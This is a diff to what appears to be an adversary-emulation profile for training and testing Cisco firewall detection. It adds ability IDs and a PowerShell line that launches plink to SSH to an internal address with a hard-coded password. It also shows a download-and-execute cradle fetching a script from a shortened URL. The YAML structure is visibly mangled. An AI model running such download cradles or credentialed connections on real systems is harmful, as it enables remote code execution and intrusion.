@@ -1,8 +1,31 @@
-name: Cisco Secure Firewall Ignite Training Test Kit
+name: Cisco FTD Ignite Training Test Kit
 description: Combine all Cisco FTD related adversery test series into single profile
 objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
 atomic_ordering:
 - d47648f0-3566-4543-a26d-5401e03e0047
+- 507d25e8-64da-402d-935f-a9ac28fe118e
+- 3f21f05c-091f-4fcd-9306-f1680cf657c3
+- c24814f6-f43a-4635-80ac-254a2d317e0e
+- d9eccb6a-46ea-466f-8ce8-69513b89f866
+- ef53f9c5-528f-4e57-abf8-293d6b852f40
+- 259c2a3b-787e-4a46-9bc4-cfe12aa191e2
+- a2748af8-336c-490d-8551-5bcf6a6de55c
+- 11a12c43-8cbe-400b-814f-759fa5422f0a
+- 86d67377-adf6-4661-83fe-21d7b11fbf6d
+- 1871776d-1930-4bbc-ab19-ebe73273f77c
+- ed25a127-16fd-4fd0-be04-52d247e276bb
+- 7e55db5a-836c-4b47-8c74-a43db9df9c01
+- bfff9006-d1fb-46ce-b173-92cb04e9a031
+- 35a5f69d-a1de-4ecb-83cb-5ead5b3b6a9a
+- 9fa98097-f724-4534-a306-923ecfeb6989
+- 9ff2f58c-f992-4db4-a520-4fc9b0f7fb67
+- 58c57344-477e-49bb-80b0-2cd467c4fca6
+- 9cf36016-35e1-4922-85ac-c41e6af5f947
+- 960687b9-9b4f-4620-b898-8f8c4fa4d439
+- d3f5a22f-fff7-41a6-a1fa-e1fede5d196b
+- e833aa2e-4b24-4de3-8671-438a3db1f6bf
+- b995db4d-fdfa-4a5f-a800-a346b2d3ebb5
+- 673e9cf1-7ee8-4eac-b513-17746986460d
 abilities: []
 ' d47648f0-3566-4543-a26d-5401e03e0047': []
 '  name': Malware
@@ -30,6 +53,9 @@ abilities: []
 ' 1871776d-1930-4bbc-ab19-ebe73273f77c': []
 ' ed25a127-16fd-4fd0-be04-52d247e276bb': []
 ' 7e55db5a-836c-4b47-8c74-a43db9df9c01': []
+'       $plinkProcess = Start-Process -FilePath C': \Users\Public\plink.exe -ArgumentList
+  "-ssh 198.18.128.193 -l sysadmin -pw C1sco12345!" -NoNewWindow -PassThru; Start-Sleep
+  -Seconds 5; $plinkProcess.Kill()
 ' bfff9006-d1fb-46ce-b173-92cb04e9a031': []
 '       powershell.exe -c IEX (New-Object Net.Webclient).downloadstring("https': //bit.ly/33H0QXi")
 ' 35a5f69d-a1de-4ecb-83cb-5ead5b3b6a9a': []
@@ -45,4 +71,4 @@ abilities: []
 ' d3f5a22f-fff7-41a6-a1fa-e1fede5d196b': []
 ' e833aa2e-4b24-4de3-8671-438a3db1f6bf': []
 ' b995db4d-fdfa-4a5f-a800-a346b2d3ebb5': []
-adversary_id: 3cb458d7-b9f5-4fe5-b120-615b3349d5cb
+adversary_id: d1eb6d55-39c1-4103-9cf5-dee11e9f086b
